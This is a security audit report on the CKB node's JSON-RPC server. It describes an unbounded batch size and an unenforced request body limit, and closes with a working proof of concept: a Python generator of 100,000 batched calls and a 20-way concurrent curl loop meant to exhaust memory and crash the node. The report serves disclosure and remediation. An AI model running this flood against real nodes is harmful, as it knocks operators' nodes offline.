Audit Report

## Title
Unbounded JSON-RPC Batch Request Size with Unenforced Body Limit Enables Node DoS — (`File: rpc/src/server.rs`)

## Summary
The CKB JSON-RPC server ships with `rpc_batch_limit` commented out in the default configuration, leaving `JSONRPC_BATCH_LIMIT` uninitialized and the batch-size guard permanently skipped. Compounding this, the `max_request_body_size` config field (set to 10 MiB in `resource/ckb.toml`) is never applied to the axum router — no `RequestBodyLimitLayer` or `DefaultBodyLimit` exists anywhere in `rpc/src/server.rs`. An unauthenticated caller can POST an arbitrarily large JSON array, forcing full deserialization of the entire `Vec<Call>` into heap memory before any call is dispatched, exhausting process memory and crashing the node.

## Finding Description
**Root cause 1 — no batch count limit by default.**
`JSONRPC_BATCH_LIMIT` is a `OnceLock<usize>` initialized only when `config.rpc_batch_limit` is `Some`:

```rust
// rpc/src/server.rs L53-55
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
```

The default configuration leaves this `None`:

```toml
# resource/ckb.toml L205-208
# By default, there is no limitation on the size of batch request size
# rpc_batch_limit = 2000
```

So `JSONRPC_BATCH_LIMIT.get()` returns `None`, the guard at L275-276 is skipped, and `stream::iter(calls)` iterates over an unbounded `Vec<Call>`:

```rust
// rpc/src/server.rs L274-296
Request::Batch(calls) => {
    if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()   // None → guard skipped
        && calls.len() > *batch_size { ... }

    let stream = stream::iter(calls)   // entire Vec already in memory
        .then(move |call| { ... io.handle_call(call, T::default()).await })
        .filter_map(...);
    (... StreamBodyAs::json_array(stream)).into_response()
}
```

**Root cause 2 — `max_request_body_size` is configured but never enforced.**
`resource/ckb.toml` sets `max_request_body_size = 10485760` and `util/app-config/src/configs/rpc.rs` L44 declares `pub rpc_batch_limit: Option<usize>`, but a grep across the entire codebase finds zero uses of `RequestBodyLimitLayer`, `DefaultBodyLimit`, or any equivalent in `rpc/src/server.rs`. The `start_server` function builds the axum router with only `CorsLayer`, `TimeoutLayer`, and two `Extension` layers — no body-size enforcement:

```rust
// rpc/src/server.rs L119-129
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())
    .layer(TimeoutLayer::with_status_code(StatusCode::REQUEST_TIMEOUT, Duration::from_secs(30)))
    .layer(Extension(stream_config));
```

The `max_request_body_size` value is read from config and stored in the `RpcConfig` struct but is never passed into `start_server` and never applied. Axum's `Bytes` extractor (used in `handle_jsonrpc`) has no built-in body size cap, unlike the `Json` extractor.

**Exploit flow:**
1. Attacker sends HTTP POST with a JSON array of N calls (e.g., N = 100,000 `get_tip_block_number` calls, ~7 MB of JSON).
2. Axum reads the full body into `Bytes` with no size check.
3. `serde_json::from_str::<Request>(req)` deserializes the entire array into `Vec<Call>` — all N entries allocated on the heap simultaneously.
4. `JSONRPC_BATCH_LIMIT.get()` returns `None`; guard is skipped.
5. `stream::iter(calls)` processes calls sequentially, each `io.handle_call()` allocating handler state and response objects.
6. Repeating with 20 concurrent connections multiplies memory pressure; OOM killer terminates the `ckb` process.

## Impact Explanation
**High — Vulnerabilities which could easily crash a CKB node (10001–15000 points).**
A successful attack terminates the `ckb` process: peers disconnect, the mempool is lost, block relay and transaction propagation halt, and the operator must manually restart. The attack is a complete loss of node availability. It does not require any authentication, prior state, or special knowledge beyond the open RPC port.

## Likelihood Explanation
**High.** Every node that has not manually uncommented `rpc_batch_limit` in `ckb.toml` is vulnerable — this is the shipped default. The RPC default bind is `127.0.0.1:8114`, but any co-located process (dApp, wallet, compromised script) qualifies as an attacker. Many operators expose the port on `0.0.0.0` for external tooling. The attack requires a single HTTP POST with no credentials, no prior knowledge, and is trivially repeatable.

## Recommendation
1. **Enforce `max_request_body_size` in the axum router** by adding `tower_http::limit::RequestBodyLimitLayer::new(config.max_request_body_size)` to the layer stack in `start_server` in `rpc/src/server.rs`.
2. **Set a safe default for `rpc_batch_limit`** in `resource/ckb.toml` (e.g., `rpc_batch_limit = 2000`) so the guard is active without operator action.
3. **Consider changing `rpc_batch_limit` from `Option<usize>` to `usize`** with a compile-time default in `util/app-config/src/configs/rpc.rs`, eliminating the possibility of an unguarded code path.

## Proof of Concept
```bash
# Generate a batch of 100,000 minimal calls (~7 MB JSON)
python3 -c "
import json, sys
calls = [{'jsonrpc':'2.0','method':'get_tip_block_number','params':[],'id':i} for i in range(100000)]
sys.stdout.write(json.dumps(calls))
" > big_batch.json

# Send 20 concurrent requests to a default CKB node
for i in $(seq 1 20); do
  curl -s -X POST -H 'Content-Type: application/json' \
    --data @big_batch.json http://127.0.0.1:8114/ > /dev/null &
done
wait
```

With `rpc_batch_limit` absent from `ckb.toml` and `max_request_body_size` unenforced in the axum router, each request deserializes 100,000 `Call` objects into heap memory. Twenty concurrent requests saturate available RAM, triggering the OOM killer and crashing the `ckb` process. The root cause is the combination of the unguarded `stream::iter(calls)` path at `rpc/src/server.rs` L284 and the missing `RequestBodyLimitLayer` in `start_server`.